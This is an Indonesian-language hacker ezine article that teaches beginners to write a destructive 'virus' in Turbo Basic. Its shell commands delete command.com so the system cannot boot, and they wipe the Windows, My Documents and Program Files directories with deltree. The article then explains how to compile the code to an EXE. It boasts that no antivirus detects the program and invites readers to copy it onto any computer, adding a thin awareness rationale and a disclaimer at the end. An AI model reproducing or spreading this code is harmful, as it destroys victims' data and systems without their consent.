@@ -1,0 +1,88 @@
+      
+
+       - ____________________   ___ ___ ________   
+       --\_   _____/\_   ___ \ /   |   \\_____  \--
+	 -|    __)_ /    \  \//    ~    \/   |   \--
+	 -|        \\     \___\    Y    /    |    \--
+	-/_______  / \______  /\___|_  /\_______  /-
+	 -      -\/        -\/      -\/        -\/- 
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE 09
+ 
+ Author: Yogya Family Code || http://www.yogyafree.tk
+ Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+
+
+== Cara membuat program perusak (Seperti Virus) ==
+
+Penulis  peduli  dengan  para  newbie yang sedang belajar pemograman sekaligus penulis juga
+peduli dengan para progammer yang belum mengenal bahasa BASIC (Maklum kebanyakan progammer
+pada langsung lompat ke Pascal, C dan lainnya).
+
+Membuat program  perusak (seperti virus) merupakan keinginan sebagian para pemula komputer,
+tapi  bagaimana  mereka bisa membuat kalau mereka tidak tahu bahasa pemograman sama sekali,
+anda  jangan  resah  untuk  masalah  ini karena saat ini penulis akan mengajarkan anda cara
+membuat program perusak ( seperti virus) yang sangat sederhana sekali tapi sangat mematikan
+bahkan bisa  dikatakan lebih mengerikan dari program perusak manapun.
+
+Pertama  kali  skill  yang  anda butuhkan adalah dasar DOS, tanpa ini anda akan sulit untuk
+berkreasi  dalam membuat program ini tapi jika anda tidak tahu dasar perintah DOS maka anda
+cukup copy paste saja, bahasa pemograman yang akan kita pakai adalah Turbo Basic v1.0, anda
+dapat mendownloadnya di Google atau cari dirental CD.
+
+Jika  anda  buta pemograman Turbo Basic maka anda masuk ke Edit lalu anda tulis Source Code
+program perusak.
+
+shell "Perintah DOS"
+
+dengan diawali kata shell maka anda dapat menjalankan perintah DOS pada program, misal anda
+membuat :
+
+shell "c:"
+shell "cd\"
+shell "del command.com"
+
+Diatas  adalah contoh  menghapus  DOS  pada  DOS Classic, Windows  95/98  sehingga pengguna
+komputer tidak dapat booting, kita contohkan yang lain.
+
+shell "c:"
+shell "cd\"
+shell "deltree /y mydocu~1"
+shell "deltree /y windows"
+shell "deltree /y progra~1"
+
+Diatas  adalah  contoh  menghapus  Directory My Document, Windows dan Program Files, sangat
+fatal bukan ?
+
+Setelah anda selesai membuat programnya maka anda save dahulu, caranya pilih File lalu Save
+lalu  beri nama filenya misal VIRUS.BAS, setelah itu baru kita mengcompile source code tadi,
+caranya pilih Options lalu pilih Compile to EXE file, setelah itu masuk ke pilihan compile
+lalu anda enter, maka source code tersebut akan menjadi file EXE.
+
+Jika  file  EXE  tersebut  dijalankan maka komputer anda akan menjalankan perintah DOS pada
+program,  dari  tutorial  diatas,  anda dapat berkreasi sendiri bagaimana virus buatan anda
+dapat  berjalan sesuai dengan anda inginkan, perlu diketahui bahwa BELUM ADA SATU ANTIVIRUS
+DIDUNIA  INI  DAPAT MENDETEKSI PROGRAM INI ADALAH VIRUS jadi anda bebas mengcopykan program
+ini ke komputer manapun yang anda suka kecuali komputer berbasis non DOS atau Windows, hehe
+
+Tujuan  dari  tutorial  ini  adalah  agar  kita lebih waspada terhadap berbagai file dengan
+ekstensi   *.exe  meskipun  file  *.exe  tersebut 100% dinyatakan bebas virus dari berbagai
+jenis Antivirus.
+
+Penulis :
+Kurniawan
+Yogya Family Code
+http://www.yogyafree.tk
+
+Salam :
+paktani.tk : "Paktani ini saya, hehe"
+/conan/ alias markov : "versi 2005 dah keluar lho",
+kartubeben : "Inget akukan :P"
+
+*Segala kesalahan error / kerusakan pada komputer dan semacamnya adalah tanggung jawab anda !
+*Semua yang anda pelajari dan anda lakukan adalah sepenuhnya tanggung jawab anda
+
+
